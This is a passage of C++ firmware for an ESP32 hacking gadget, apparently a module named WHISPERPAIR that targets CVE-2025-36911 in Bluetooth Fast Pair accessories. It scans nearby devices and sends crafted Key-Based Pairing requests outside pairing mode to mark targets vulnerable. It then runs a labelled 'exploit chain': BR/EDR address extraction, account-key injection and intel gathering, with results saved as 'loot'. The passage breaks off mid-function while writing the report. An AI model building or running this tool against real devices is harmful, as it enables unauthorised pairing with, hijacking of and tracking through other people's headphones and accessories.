// ─── Helpers ─────────────────────────────────────────────────────────────
static const char* wpLookupModel(uint32_t mid) {
    for (int i = 0; i < (int)WP_MODEL_COUNT; i++) {
        uint32_t m = ((uint32_t)wpModels[i].id[0] << 16) |
                     ((uint32_t)wpModels[i].id[1] << 8) |
                     wpModels[i].id[2];
        if (m == mid) return wpModels[i].name;
    }
    return nullptr;
}

static const char* wpResultStr(uint8_t r) {
    switch (r) {
        case WPR_UNREACHABLE: return "UNREACHABLE";
        case WPR_NO_SERVICE:  return "NO FP SERVICE";
        case WPR_NO_CHAR:     return "SECURE";
        case WPR_EXPOSED:     return "EXPOSED";
        case WPR_VULNERABLE:  return "VULNERABLE";
        default:              return "NOT TESTED";
    }
}

static uint16_t wpResultColor(uint8_t r) {
    switch (r) {
        case WPR_NO_CHAR:     return 0x07E0;   // Green
        case WPR_EXPOSED:     return 0xFFE0;   // Yellow
        case WPR_VULNERABLE:  return 0xF800;   // Red
        default:              return HALEHOUND_GUNMETAL;
    }
}

// ─── Notification Callback ───────────────────────────────────────────────
static void wpNotifyCb(BLERemoteCharacteristic* pChar, uint8_t* data, size_t len, bool isNotify) {
    wpNotifRx = true;
    wpNotifLen = (len > 20) ? 20 : len;
    memcpy(wpNotifData, data, wpNotifLen);
    #if CYD_DEBUG
    Serial.printf("[WP] KBP notification received! len=%d\n", len);
    for (size_t i = 0; i < wpNotifLen; i++) Serial.printf("%02X ", wpNotifData[i]);
    Serial.println();
    #endif
}

// ─── UI Drawing ──────────────────────────────────────────────────────────
static void wpDrawHeader() {
    tft.drawLine(0, 19, tft.width(), 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.drawBitmap(wpIconX[0], wpIconY, bitmap_icon_undo, 16, 16, HALEHOUND_MAGENTA);
    tft.drawBitmap(wpIconX[1], wpIconY, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    tft.drawBitmap(112, wpIconY, bitmap_icon_sdcard, 16, 16, HALEHOUND_MAGENTA);
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
    // Nosifer glitch title — chromatic aberration effect
    drawGlitchTitle(55, "WHISPERPAIR");
    // CVE subtitle centered in electric blue
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA);
    int cveW = 14 * 6;
    tft.setCursor((SCREEN_WIDTH - cveW) / 2, 68);
    tft.print("CVE-2025-36911");
}

static void wpDrawList() {
    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);

    // Sub-header bar — dark background like spoofer mode bar
    tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 82);
    tft.print("Fast Pair Targets: ");
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.print(wpCount);
    tft.drawLine(0, 94, SCREEN_WIDTH, 94, HALEHOUND_HOTPINK);

    if (wpCount == 0) {
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(10, 105);
        tft.print("No Fast Pair devices");
        tft.setCursor(10, 120);
        tft.print("found nearby.");
        tft.setTextColor(HALEHOUND_VIOLET);
        tft.setCursor(10, 145);
        tft.print("Ensure targets are powered");
        tft.setCursor(10, 158);
        tft.print("on and within BLE range.");
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(5, SCREEN_HEIGHT - 12);
        tft.print("SEL=Rescan  BACK=Exit");
        return;
    }

    int y = 98;
    for (int i = 0; i < WP_MAX_VISIBLE && i + wpListStart < wpCount; i++) {
        int idx = i + wpListStart;
        FPDevice& d = wpDevs[idx];

        if (idx == wpCurIdx) {
            tft.fillRect(0, y - 2, SCREEN_WIDTH, WP_LINE_HEIGHT, HALEHOUND_DARK);
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(5, y);
            tft.print("> ");
        } else {
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.setCursor(5, y);
            tft.print("  ");
        }

        tft.setCursor(20, y);
        String nm = String(d.name).substring(0, 14);
        tft.print(nm);

        if (d.result != WPR_NONE) {
            tft.setCursor(SCREEN_WIDTH - 65, y);
            tft.setTextColor(wpResultColor(d.result));
            if (d.result == WPR_VULNERABLE) tft.print("VULN");
            else if (d.result == WPR_EXPOSED) tft.print("EXPD");
            else if (d.result == WPR_NO_CHAR) tft.print("OK");
            else tft.print("--");
        } else {
            tft.setCursor(SCREEN_WIDTH - 50, y);
            tft.setTextColor(HALEHOUND_VIOLET);
            tft.print(d.rssi);
            tft.print("dB");
        }

        y += WP_LINE_HEIGHT;
    }

    tft.drawLine(0, SCREEN_HEIGHT - 18, SCREEN_WIDTH, SCREEN_HEIGHT - 18, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("SEL=Probe UP/DN=Nav L=Scan");
}

static void wpDrawProbeStatus(int line, const char* msg, uint16_t col) {
    int y = 135 + line * 15;
    tft.fillRect(0, y, SCREEN_WIDTH, 14, HALEHOUND_BLACK);
    tft.setTextColor(col);
    tft.setCursor(10, y);
    tft.print(msg);
}

static void wpDrawResult() {
    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);

    FPDevice& d = wpDevs[wpProbeIdx];

    // Sub-header bar
    tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 82);
    tft.print("PROBE RESULT");
    tft.drawLine(0, 94, SCREEN_WIDTH, 94, HALEHOUND_HOTPINK);

    int y = 100;
    // Labels in electric blue, values in hot pink
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y); tft.print("Name: ");
    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.name);
    y += 15;
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y); tft.print("MAC:  ");
    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.addrStr);
    y += 15;
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y); tft.print("RSSI: ");
    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.rssi); tft.print(" dBm");
    y += 15;
    tft.setTextColor(HALEHOUND_MAGENTA);
    char modelHex[16];
    snprintf(modelHex, sizeof(modelHex), "0x%06X", d.modelId);
    tft.setCursor(10, y); tft.print("Model: ");
    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(modelHex);
    y += 20;

    // Result banner with rounded border
    tft.drawLine(0, y - 4, SCREEN_WIDTH, y - 4, HALEHOUND_DARK);
    uint16_t rc = wpResultColor(d.result);
    tft.fillRoundRect(8, y, SCREEN_WIDTH - 16, 26, 4, rc);
    tft.drawRoundRect(7, y - 1, SCREEN_WIDTH - 14, 28, 4, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_BLACK);
    const char* rs = wpResultStr(d.result);
    int tw = strlen(rs) * 6;
    tft.setCursor((SCREEN_WIDTH - tw) / 2, y + 8);
    tft.print(rs);
    y += 36;

    // Explanation text
    tft.setTextColor(HALEHOUND_MAGENTA);
    switch (d.result) {
        case WPR_VULNERABLE:
            tft.setCursor(10, y);
            tft.print("Device responded to KBP");
            tft.setCursor(10, y + 14);
            tft.print("request outside pair mode");
            tft.setCursor(10, y + 30);
            tft.setTextColor(0xF800);
            tft.print("CVE-2025-36911 CONFIRMED");
            break;
        case WPR_EXPOSED:
            tft.setCursor(10, y);
            tft.print("KBP characteristic found");
            tft.setCursor(10, y + 14);
            tft.print("outside pairing mode.");
            tft.setCursor(10, y + 30);
            tft.setTextColor(0xFFE0);
            tft.print("Potentially vulnerable");
            break;
        case WPR_NO_CHAR:
            tft.setCursor(10, y);
            tft.print("FP service present but");
            tft.setCursor(10, y + 14);
            tft.print("KBP char not exposed.");
            tft.setCursor(10, y + 30);
            tft.setTextColor(0x07E0);
            tft.print("Appears patched");
            break;
        case WPR_NO_SERVICE:
            tft.setCursor(10, y);
            tft.print("Fast Pair GATT service");
            tft.setCursor(10, y + 14);
            tft.print("not accessible via GATT");
            break;
        case WPR_UNREACHABLE:
            tft.setCursor(10, y);
            tft.print("GATT connection failed.");
            tft.setCursor(10, y + 14);
            tft.print("Target may be out of range");
            break;
    }

    // Bottom bar with ATTACK button for vulnerable devices
    tft.drawLine(0, SCREEN_HEIGHT - 38, SCREEN_WIDTH, SCREEN_HEIGHT - 38, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("BACK");

    if (d.result == WPR_EXPOSED || d.result == WPR_VULNERABLE) {
        tft.fillRoundRect(140, SCREEN_HEIGHT - 34, 92, 26, 4, 0xF800);
        tft.drawRoundRect(139, SCREEN_HEIGHT - 35, 94, 28, 4, HALEHOUND_MAGENTA);
        tft.drawBitmap(146, SCREEN_HEIGHT - 29, bitmap_icon_sword, 16, 16, HALEHOUND_BLACK);
        tft.setTextColor(HALEHOUND_BLACK);
        tft.setCursor(166, SCREEN_HEIGHT - 25);
        tft.print("ATTACK");
    }
}

// ─── Scan ────────────────────────────────────────────────────────────────
static void wpDoScan() {
    wpCount = 0;
    wpCurIdx = 0;
    wpListStart = 0;

    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, 88);
    tft.print("[*] FAST PAIR SCAN ACTIVE");
    tft.drawLine(10, 98, 200, 98, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, 108);
    tft.print("Hunting targets...");
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(10, 128);
    tft.print("Scan duration: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print(WP_SCAN_SECS);
    tft.print("s");

    BLEScanResults results = pWpScan->start(WP_SCAN_SECS, false);

    int total = results.getCount();
    #if CYD_DEBUG
    Serial.printf("[WP] Scan got %d total BLE devices\n", total);
    #endif

    for (int i = 0; i < total && wpCount < WP_MAX_DEVICES; i++) {
        BLEAdvertisedDevice device = results.getDevice(i);
        if (!device.haveServiceData()) continue;

        BLEUUID sdUUID = device.getServiceDataUUID();
        if (!sdUUID.equals(BLEUUID((uint16_t)0xFE2C))) continue;

        std::string sd = device.getServiceData();
        if (sd.length() < 3) continue;

        // Check duplicate MAC
        String addr = String(device.getAddress().toString().c_str());
        bool dup = false;
        for (int j = 0; j < wpCount; j++) {
            if (addr.equals(wpDevs[j].addrStr)) { dup = true; break; }
        }
        if (dup) continue;

        FPDevice& d = wpDevs[wpCount];
        strncpy(d.addrStr, addr.c_str(), 17);
        d.addrStr[17] = '\0';
        d.addrType = device.getAddressType();
        d.rssi = device.getRSSI();
        d.result = WPR_NONE;

        // Extract model ID (3 bytes big-endian)
        d.modelId = ((uint32_t)(uint8_t)sd[0] << 16) |
                    ((uint32_t)(uint8_t)sd[1] << 8)  |
                    (uint8_t)sd[2];

        const char* known = wpLookupModel(d.modelId);
        if (known) {
            strncpy(d.name, known, 23);
        } else if (device.getName().length() > 0) {
            strncpy(d.name, device.getName().c_str(), 23);
        } else {
            snprintf(d.name, 24, "FP:%06X", d.modelId);
        }
        d.name[23] = '\0';

        wpCount++;

        #if CYD_DEBUG
        Serial.printf("[WP] FP device: %s [%s] RSSI:%d Model:0x%06X\n",
                      d.name, d.addrStr, d.rssi, d.modelId);
        #endif
    }

    wpDrawList();
}

// ─── GATT Probe ──────────────────────────────────────────────────────────
static void wpProbeDevice(int idx) {
    wpProbeIdx = idx;
    inResult = false;
    FPDevice& d = wpDevs[idx];
    wpNotifRx = false;
    d.result = WPR_UNREACHABLE;

    // Stop scan before GATT client operations
    if (pWpScan) pWpScan->stop();

    // Draw probe UI
    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 82);
    tft.print("[*] PROBING TARGET");
    tft.drawLine(5, 94, 180, 94, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, 100);
    tft.print(d.name);
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(10, 115);
    tft.print(d.addrStr);

    // Disconnect from previous target if still connected (user picked a different device)
    if (pWpClient && pWpClient->isConnected()) {
        pWpClient->disconnect();
        delay(300);
    }

    // Create or reuse GATT client
    if (!pWpClient) {
        pWpClient = BLEDevice::createClient();
        if (!pWpClient) {
            #if CYD_DEBUG
            Serial.println("[WP] Failed to create BLE client");
            #endif
            inResult = true;
            wpDrawResult();
            return;
        }
    }

    // Attempt GATT connection
    wpDrawProbeStatus(0, "Connecting...", HALEHOUND_HOTPINK);
    BLEAddress addr(d.addrStr);
    bool connected = pWpClient->connect(addr, d.addrType);

    if (!connected) {
        #if CYD_DEBUG
        Serial.printf("[WP] GATT connect failed: %s\n", d.addrStr);
        #endif
        inResult = true;
        wpDrawResult();
        return;
    }

    wpDrawProbeStatus(0, "Connected!", HALEHOUND_MAGENTA);
    #if CYD_DEBUG
    Serial.printf("[WP] Connected to %s\n", d.addrStr);
    #endif

    // Discover Fast Pair service (try 128-bit then 16-bit UUID)
    wpDrawProbeStatus(1, "Finding FP service...", HALEHOUND_HOTPINK);
    BLERemoteService* pSvc = pWpClient->getService(wpFpUUID128);
    if (!pSvc) {
        pSvc = pWpClient->getService(wpFpUUID16);
    }

    if (!pSvc) {
        d.result = WPR_NO_SERVICE;
        pWpClient->disconnect();
        #if CYD_DEBUG
        Serial.println("[WP] Fast Pair service not found");
        #endif
        inResult = true;
        wpDrawResult();
        return;
    }

    wpDrawProbeStatus(1, "FP Service FOUND!", HALEHOUND_MAGENTA);
    delay(200);

    // Find Key-Based Pairing characteristic
    wpDrawProbeStatus(2, "Finding KBP char...", HALEHOUND_HOTPINK);
    BLERemoteCharacteristic* pKbp = pSvc->getCharacteristic(wpKbpUUID);

    if (!pKbp) {
        d.result = WPR_NO_CHAR;
        pWpClient->disconnect();
        #if CYD_DEBUG
        Serial.println("[WP] KBP char not found — device appears patched");
        #endif
        inResult = true;
        wpDrawResult();
        return;
    }

    // KBP characteristic accessible outside pairing mode!
    wpDrawProbeStatus(2, "KBP Char FOUND!", HALEHOUND_HOTPINK);
    d.result = WPR_EXPOSED;

    #if CYD_DEBUG
    Serial.println("[WP] KBP characteristic accessible outside pairing mode!");
    #endif

    // Subscribe to notifications
    if (pKbp->canNotify()) {
        pKbp->registerForNotify(wpNotifyCb);
        delay(100);
    }

    // Write test KBP request (16 bytes)
    // Byte 0: Message type (0x00 = Key-Based Pairing Request)
    // Byte 1: Flags (0x40 = request provider BR/EDR address)
    // Bytes 4-9: Target BLE address from advertisement
    // Bytes 10-15: Random salt
    wpDrawProbeStatus(3, "Sending KBP request...", HALEHOUND_HOTPINK);

    uint8_t kbpReq[16];
    kbpReq[0] = 0x00;  // KBP Request message type
    kbpReq[1] = 0x40;  // Flags
    kbpReq[2] = 0x00;
    kbpReq[3] = 0x00;
    for (int i = 4; i < 16; i++) kbpReq[i] = (uint8_t)random(256);

    // Parse target address into request bytes 4-9
    uint8_t addrBytes[6];
    sscanf(d.addrStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &addrBytes[0], &addrBytes[1], &addrBytes[2],
           &addrBytes[3], &addrBytes[4], &addrBytes[5]);
    memcpy(&kbpReq[4], addrBytes, 6);

    // Write the request (try write-with-response first)
    if (pKbp->canWrite()) {
        pKbp->writeValue(kbpReq, 16, true);
    } else {
        pKbp->writeValue(kbpReq, 16, false);
    }

    // Wait up to 3 seconds for notification response
    wpDrawProbeStatus(3, "Waiting for response...", HALEHOUND_HOTPINK);
    unsigned long t0 = millis();
    while (millis() - t0 < 3000 && !wpNotifRx) {
        delay(50);
    }

    if (wpNotifRx) {
        d.result = WPR_VULNERABLE;
        wpDrawProbeStatus(3, "RESPONSE RECEIVED!", 0xF800);
        delay(500);
        #if CYD_DEBUG
        Serial.println("[WP] VULNERABLE — responded to KBP outside pairing mode!");
        #endif
    }

    // Stay connected — attack reuses this GATT session to avoid reconnection failures
    // Connection will be cleaned up by wpRunAttack(), cleanup(), or next probe

    inResult = true;
    wpDrawResult();
}

// ─── Attack Log ──────────────────────────────────────────────────────────
static void wpAtkAddLog(const char* msg, uint16_t color) {
    if (wpAtkLogCount < WP_ATK_LOG_LINES) {
        strncpy(wpAtkLog[wpAtkLogCount], msg, WP_ATK_LOG_WIDTH - 1);
        wpAtkLog[wpAtkLogCount][WP_ATK_LOG_WIDTH - 1] = '\0';
        wpAtkLogColors[wpAtkLogCount] = color;
        wpAtkLogCount++;
    } else {
        for (int i = 0; i < WP_ATK_LOG_LINES - 1; i++) {
            memcpy(wpAtkLog[i], wpAtkLog[i + 1], WP_ATK_LOG_WIDTH);
            wpAtkLogColors[i] = wpAtkLogColors[i + 1];
        }
        strncpy(wpAtkLog[WP_ATK_LOG_LINES - 1], msg, WP_ATK_LOG_WIDTH - 1);
        wpAtkLog[WP_ATK_LOG_LINES - 1][WP_ATK_LOG_WIDTH - 1] = '\0';
        wpAtkLogColors[WP_ATK_LOG_LINES - 1] = color;
    }
}

static void wpDrawAtkLog() {
    int startY = 98;
    int lineH = 15;
    int drawCount = (wpAtkLogCount < WP_ATK_LOG_LINES) ? wpAtkLogCount : WP_ATK_LOG_LINES;
    tft.fillRect(0, startY, SCREEN_WIDTH, WP_ATK_LOG_LINES * lineH, HALEHOUND_BLACK);
    for (int i = 0; i < drawCount; i++) {
        tft.setTextColor(wpAtkLogColors[i]);
        tft.setCursor(5, startY + i * lineH);
        tft.print(wpAtkLog[i]);
    }
}

// ─── Attack Report Display ──────────────────────────────────────────────
static void wpDrawAttackReport() {
    if (wpProbeIdx < 0) return;
    FPDevice& d = wpDevs[wpProbeIdx];

    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);

    if (atkResultPage == 0) {
        // ─── Page 1: Summary ─────────────────────────────────────────
        tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
        tft.setTextColor(0xF800);
        tft.setCursor(5, 82);
        tft.print("ATTACK REPORT");
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(SCREEN_WIDTH - 24, 82);
        tft.print("1/2");
        tft.drawLine(0, 94, SCREEN_WIDTH, 94, 0xF800);

        int y = 100;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y); tft.print("Target: ");
        tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.name);
        y += 12;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y); tft.print("BLE: ");
        tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.addrStr);
        y += 16;

        // BR/EDR address — prominent
        if (wpAtkResult.hasBrEdr) {
            tft.fillRoundRect(5, y, SCREEN_WIDTH - 10, 28, 3, HALEHOUND_DARK);
            tft.drawRoundRect(4, y - 1, SCREEN_WIDTH - 8, 30, 3, 0xF800);
            tft.setTextColor(0xF800);
            tft.setCursor(10, y + 3);
            tft.print("BR/EDR:");
            char brStr[20];
            snprintf(brStr, sizeof(brStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                     wpAtkResult.brEdrAddr[0], wpAtkResult.brEdrAddr[1],
                     wpAtkResult.brEdrAddr[2], wpAtkResult.brEdrAddr[3],
                     wpAtkResult.brEdrAddr[4], wpAtkResult.brEdrAddr[5]);
            tft.setCursor(10, y + 15);
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.print(brStr);
            y += 34;
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.setCursor(5, y);
            tft.print("BR/EDR: Not extracted");
            y += 14;
        }

        y += 2;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Phase 1: KBP Exploit");
        y += 12;

        for (int s = 0; s < 4; s++) {
            tft.setCursor(10, y);
            tft.setTextColor(HALEHOUND_VIOLET);
            tft.print(wpStrategies[s].name);
            tft.setCursor(130, y);
            if (wpAtkResult.strategyResults[s] == 2) {
                tft.setTextColor(0x07E0);
                tft.print("HIT");
            } else if (wpAtkResult.strategyResults[s] == 1) {
                tft.setTextColor(HALEHOUND_GUNMETAL);
                tft.print("---");
            } else {
                tft.setTextColor(HALEHOUND_GUNMETAL);
                tft.print("N/A");
            }
            y += 11;
        }

        y += 4;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Phase 2: ");
        if (wpAtkResult.acctKeyWritten) {
            tft.setTextColor(0x07E0);
            tft.print("Key INJECTED");
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.print("Key not written");
        }
        y += 14;

        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Phase 3: ");
        int intelCount = 0;
        if (wpAtkResult.hasPasskey) intelCount++;
        if (wpAtkResult.hasAdditional) intelCount++;
        if (wpAtkResult.hasModelId) intelCount++;
        if (wpAtkResult.hasFirmware) intelCount++;
        char intelStr[16];
        snprintf(intelStr, sizeof(intelStr), "%d chars found", intelCount);
        tft.setTextColor(intelCount > 0 ? 0x07E0 : HALEHOUND_GUNMETAL);
        tft.print(intelStr);

    } else {
        // ─── Page 2: Raw Data ────────────────────────────────────────
        tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
        tft.setTextColor(0xF800);
        tft.setCursor(5, 82);
        tft.print("RAW INTEL");
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(SCREEN_WIDTH - 24, 82);
        tft.print("2/2");
        tft.drawLine(0, 94, SCREEN_WIDTH, 94, 0xF800);

        int y = 100;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("KBP Response:");
        y += 12;

        if (wpAtkResult.kbpRespLen > 0) {
            char hexLine[42];
            for (int row = 0; row < 2; row++) {
                int pos = 0;
                for (int i = row * 8; i < (row + 1) * 8 && (size_t)i < wpAtkResult.kbpRespLen; i++) {
                    pos += snprintf(hexLine + pos, sizeof(hexLine) - pos,
                                    "%02X ", wpAtkResult.kbpResp[i]);
                }
                if (pos > 0) {
                    hexLine[pos] = '\0';
                    tft.setTextColor(HALEHOUND_HOTPINK);
                    tft.setCursor(10, y);
                    tft.print(hexLine);
                    y += 11;
                }
            }
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.setCursor(10, y);
            tft.print("No response captured");
            y += 11;
        }

        y += 6;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Account Key:");
        y += 12;

        if (wpAtkResult.acctKeyWritten) {
            tft.drawBitmap(SCREEN_WIDTH - 22, y - 10, bitmap_icon_key, 16, 16, 0x07E0);
            char hexLine[42];
            for (int row = 0; row < 2; row++) {
                int pos = 0;
                for (int i = row * 8; i < (row + 1) * 8; i++) {
                    pos += snprintf(hexLine + pos, sizeof(hexLine) - pos,
                                    "%02X ", wpAtkResult.acctKey[i]);
                }
                hexLine[pos] = '\0';
                tft.setTextColor(HALEHOUND_HOTPINK);
                tft.setCursor(10, y);
                tft.print(hexLine);
                y += 11;
            }
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.setCursor(10, y);
            tft.print("Not written");
            y += 11;
        }

        y += 6;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Firmware: ");
        if (wpAtkResult.hasFirmware) {
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.print(wpAtkResult.firmware);
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.print("Unknown");
        }
        y += 14;

        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Model ID: ");
        if (wpAtkResult.hasModelId) {
            tft.setTextColor(HALEHOUND_HOTPINK);
            char midStr[12];
            snprintf(midStr, sizeof(midStr), "0x%02X%02X%02X",
                     wpAtkResult.modelIdBytes[0], wpAtkResult.modelIdBytes[1],
                     wpAtkResult.modelIdBytes[2]);
            tft.print(midStr);
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            char mhex[12];
            snprintf(mhex, sizeof(mhex), "0x%06X", d.modelId);
            tft.print(mhex);
        }
    }

    // Bottom navigation bar
    tft.drawLine(0, SCREEN_HEIGHT - 38, SCREEN_WIDTH, SCREEN_HEIGHT - 38, HALEHOUND_DARK);

    // SAVE button (left)
    tft.fillRoundRect(5, SCREEN_HEIGHT - 34, 70, 26, 4, HALEHOUND_DARK);
    tft.drawRoundRect(4, SCREEN_HEIGHT - 35, 72, 28, 4, HALEHOUND_MAGENTA);
    tft.drawBitmap(10, SCREEN_HEIGHT - 29, bitmap_icon_save, 16, 16, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(30, SCREEN_HEIGHT - 25);
    tft.print("SAVE");

    // Page nav (right)
    tft.setTextColor(HALEHOUND_VIOLET);
    if (atkResultPage == 0) {
        tft.setCursor(SCREEN_WIDTH - 55, SCREEN_HEIGHT - 25);
        tft.print("1/2");
        tft.drawBitmap(SCREEN_WIDTH - 22, SCREEN_HEIGHT - 29, bitmap_icon_RIGHT, 16, 16, HALEHOUND_VIOLET);
    } else {
        tft.drawBitmap(SCREEN_WIDTH - 60, SCREEN_HEIGHT - 29, bitmap_icon_LEFT, 16, 16, HALEHOUND_VIOLET);
        tft.setCursor(SCREEN_WIDTH - 38, SCREEN_HEIGHT - 25);
        tft.print("2/2");
    }
}

// ─── SD Card Loot Save ──────────────────────────────────────────────────
static void wpSaveLoot() {
    if (wpProbeIdx < 0) return;
    FPDevice& d = wpDevs[wpProbeIdx];

    // Visual feedback — flash save button green immediately
    tft.fillRoundRect(5, SCREEN_HEIGHT - 34, 70, 26, 4, 0x07E0);
    tft.setTextColor(TFT_BLACK);
    tft.setCursor(15, SCREEN_HEIGHT - 25);
    tft.print("SAVING");

    #if CYD_DEBUG
    Serial.printf("[WP-SAVE] wpSaveLoot called — heap: %u\n", ESP.getFreeHeap());
    #endif

    // Shut down BLE before SD access — BLE controller DMA/interrupts disrupt VSPI bus
    if (pWpClient) {
        if (pWpClient->isConnected()) pWpClient->disconnect();
        pWpClient = nullptr;
    }
    if (pWpScan) { pWpScan->stop(); pWpScan = nullptr; }
    BLEDevice::deinit(false);
    delay(100);

    spiDeselect();
    SPI.end();
    delay(10);
    SPI.begin(18, 19, 23);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);
    delay(10);

    if (!SD.begin(SD_CS, SPI, 4000000)) {
        SPI.end();
        delay(50);
        SPI.begin(18, 19, 23);
        if (!SD.begin(SD_CS, SPI, 4000000)) {
            #if CYD_DEBUG
            Serial.printf("[WP-SAVE] SD FAILED — heap: %u\n", ESP.getFreeHeap());
            #endif
            tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
            tft.setTextColor(0xF800);
            tft.setCursor(10, SCREEN_HEIGHT - 52);
            tft.print("SD card not found!");
            SD.end();
            return;
        }
    }

    if (!SD.exists("/wp_loot")) {
        SD.mkdir("/wp_loot");
    }

    char safeMac[18];
    strncpy(safeMac, d.addrStr, 17);
    safeMac[17] = '\0';
    for (int i = 0; i < 17; i++) {
        if (safeMac[i] == ':') safeMac[i] = '-';
    }

    char fname[48];
    snprintf(fname, sizeof(fname), "/wp_loot/%s_%lu.txt", safeMac, millis());

    File f = SD.open(fname, FILE_WRITE);
    if (!f) {
        tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
        tft.setTextColor(0xF800);
        tft.setCursor(10, SCREEN_HEIGHT - 52);
        tft.print("File write failed!");
        SD.end();
        return;
    }

    f.println("========================================");
    f.println("  WHISPERPAIR ATTACK REPORT");
    f.println("  CVE-2025-36911 Exploit Chain");
    f.println("  HaleHound Edition");
    f.println("========================================");
    f.println();
    f.printf("Target:  %s\n", d.name);
    f.printf("BLE MAC: %s\n", d.addrStr);
    f.printf("RSSI:    %d dBm\n", d.rssi);
    f.printf("Model:   0x%06X\n", d.modelId);
    f.println();

    if (wpAtkResult.hasBrEdr) {
        f.printf("BR/EDR Address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                 wpAtkResult.brEdrAddr[0], wpAtkResult.brEdrAddr[1],
                 wpAtkResult.brEdrAddr[2], wpAtkResult.brEdrAddr[3],
                 wpAtkResult.brEdrAddr[4], wpAtkResult.brEdrAddr[5]);
    } else {
        f.println("BR/EDR Address: Not extracted");
    }
    f.println();

    f.println("-- Phase 1: KBP Exploit --");
    for (int s = 0; s < 4; s++) {
        const char* status = "N/A";
        if (wpAtkResult.strategyResults[s] == 2) status = "HIT";
        else if (wpAtkResult.strategyResults[s] == 1) status = "MISS";
        f.printf("  %s: %s\n", wpStrategies[s].name, status);
    }
    f.println();

    if (wpAtkResult.kbpRespLen > 0) {
        f.print("KBP Response: ");
        for (size_t i = 0; i < wpAtkResult.kbpRespLen; i++) {
            f.printf("%02X ", wpAtkResult.kbpResp[i]);
        }
        f.println();
    }
    f.println();

    f.println("-- Phase 2: Account Key --");
    if (wpAtkResult.acctKeyWritten) {
        f.print("  Key: ");
        for (int i = 0; i < 16; i++) {
            f.printf("%02X ", wpAtkResult.acctKey[i]);
        }
        f.println();
